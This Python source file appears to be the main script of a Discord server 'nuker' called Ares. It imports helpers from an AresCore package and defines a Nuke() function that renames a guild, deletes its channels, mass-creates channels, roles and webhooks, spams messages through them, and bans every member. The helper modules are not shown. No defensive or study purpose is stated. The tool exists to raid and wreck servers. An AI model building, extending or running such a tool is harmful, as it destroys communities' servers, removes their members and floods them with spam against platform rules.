from AresCore.channels import CreateChannels, DeleteChannels
from AresCore.users import BanAll, SendMessage
from AresCore.roles import CreateRoles
from AresCore.webhooks import CreateWebhooks, GetWebhooks, WebhooksSend
from AresCore.guild import ChangeNameGuild
from AresCore.requests_maker import StartRequestMaker
import time

StartRequestMaker()


def Nuke() -> None:
	ChangeNameGuild()
	DeleteChannels()
	CreateChannels()
	CreateRoles()
	CreateWebhooks()
	WebhooksSend()
	BanAll()
	SendMessage()

